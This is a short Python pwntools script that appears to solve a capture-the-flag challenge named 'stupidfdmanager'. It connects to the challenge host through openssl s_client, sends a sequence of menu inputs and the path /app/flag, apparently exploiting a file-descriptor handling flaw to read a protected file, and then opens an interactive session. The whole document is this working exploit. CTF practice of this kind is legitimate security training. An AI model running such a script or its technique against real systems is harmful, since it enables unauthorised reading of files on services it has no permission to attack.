from pwn import *

# io = process(["./a.out"])
hostname = "stupidfdmanager-ae215787cde689d4.chal.bts.wh.edu.pl"
io = process(
    [
        "openssl",
        "s_client",
        "-connect",
        f"{hostname}:443",
        "-servername",
        hostname,
        "-quiet",
    ]
)

io.sendline(b"3")
io.sendline(b"0")
io.sendline(b"2")
io.sendline(b"/app/flag")
io.interactive()
